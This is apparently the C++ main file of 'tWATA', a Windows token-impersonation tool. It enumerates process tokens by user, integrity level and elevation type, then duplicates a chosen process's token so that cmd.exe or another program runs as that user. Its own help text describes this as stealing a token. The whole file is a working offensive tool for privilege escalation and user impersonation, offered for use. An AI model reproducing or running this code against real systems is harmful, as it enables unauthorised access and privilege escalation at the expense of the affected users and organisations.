#include "token.h"
#include <unordered_map>
#include <list>
#include <iostream>
#include <string>
#include <codecvt>
#include "argparse.hpp"

void enumerateProcessess();

struct TOKEN_INFORMATION
{
	HANDLE hToken;
	INT pid;
	TUSER tokenUserInformation;
	TSTAT tokenStatistics;
	TINTG tokenIntegrityLevel;
	TELEV tokenElevationType;
};

std::wstring convert_to_wstring(const std::string& utf8)
{

}

int main(int argc, char* argv[])
{
	argparse::ArgumentParser program("tWATA", "1.0.1");
	program.add_argument("--pid")
		.help("provide a pid to steal token from")
		.default_value(0)
		.scan<'i', int>();
	program.add_argument("--cmd")
		.help("provide program to execute on behalf of the impersonated user")
		.default_value(std::string("C:\\Windows\\System32\\cmd.exe"));
	program.add_argument("--enumerate").help("enumerate tokens").implicit_value(true);

	try
	{
		program.parse_args(argc, argv);
		if (argc == 1)
		{
			std::cout << program;
			std::exit(1);
		}
	}
	catch (const std::runtime_error& err)
	{
		std::cerr << err.what() << std::endl;
		std::cerr << program;
		std::exit(1);
	}

	int pid = program.get<int>("--pid");
	
	std::string cmd = program.get<std::string>("--cmd");

	HANDLE hProcessSnap;
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (hProcessSnap == INVALID_HANDLE_VALUE)
	{
		printf("[-] process snapshot could not be created: %d\n", GetLastError());
		exit(1);
	}

	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (!Process32First(hProcessSnap, &pe32))
	{
		printf("[-] failed getting first process\n");
		CloseHandle(hProcessSnap);
		exit(1);
	}

	std::unordered_map<std::wstring, std::list<TOKEN_INFORMATION>> username_tokeninfo{};
	std::unordered_map<int, HANDLE> pid_token{};

	HANDLE hProcess;
	HANDLE hToken;
	do
	{
		TOKEN_INFORMATION tInfo = {};
		hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, pe32.th32ProcessID);
		if (hProcess)
		{
			if (OpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_DUPLICATE, &hToken))
			{
				tInfo.hToken = hToken;
				tInfo.pid = pe32.th32ProcessID;
				tInfo.tokenUserInformation = getTokenUser(hToken);
				tInfo.tokenStatistics = getTokenStatistics(hToken);
				tInfo.tokenIntegrityLevel = getTokenIntegrityLevel(hToken);
				tInfo.tokenElevationType = getTokenElevationType(hToken);

				wchar_t* user;
				user = wcscat(tInfo.tokenUserInformation.lpDomain, L"\\");
				user = wcscat(user, tInfo.tokenUserInformation.lpName);
				std::wstring wuser(user);

				if (!username_tokeninfo.count(wuser))
				{
					username_tokeninfo[wuser] = {};
				}
				std::list tokens = username_tokeninfo[wuser];
				tokens.insert(tokens.end(), tInfo);
				username_tokeninfo[wuser] = tokens;

				pid_token[pe32.th32ProcessID] = hToken;
			}
		}
	} while (Process32Next(hProcessSnap, &pe32));

	CloseHandle(hProcessSnap);

	if (program.is_used("--enumerate"))
	{
		int i = 0;
		wprintf(L"Available tokens for impersonation: \n");
		for (const auto& kv : username_tokeninfo)
		{
			i++;
			wprintf(L"[%d] %s\n", i, kv.first.c_str());
			std::list<TOKEN_INFORMATION> tokens = kv.second;
			for (TOKEN_INFORMATION token : tokens)
			{
				wprintf(L"\t[%d] TokenType: %s\tImpersonationLevel: %s\tisElevated: %s\tElevationType: %s\tIntegrityLevel: %s\n",
					token.pid, token.tokenStatistics.tokenType, token.tokenStatistics.impersonationLevel, token.tokenElevationType.isElevated, token.tokenElevationType.elevationType, token.tokenIntegrityLevel.integrityLevel);
			}
		}
	}
	
	if (program.is_used("--pid"))
	{
		hToken = pid_token[pid];

		if (program.is_used("--cmd"))
		{
			std::wstring wcmd(cmd.begin(), cmd.end());
			std::vector<wchar_t> buffer(wcmd.begin(), wcmd.end());
			buffer.push_back(L'\0');
			wchar_t * cmd = buffer.data();
			stealToken(hToken, cmd);
		}
		else
		{
			wchar_t cmd[] = L"C:\\Windows\\System32\\cmd.exe\0";
			stealToken(hToken, cmd);
		}
	}

	return 0;
}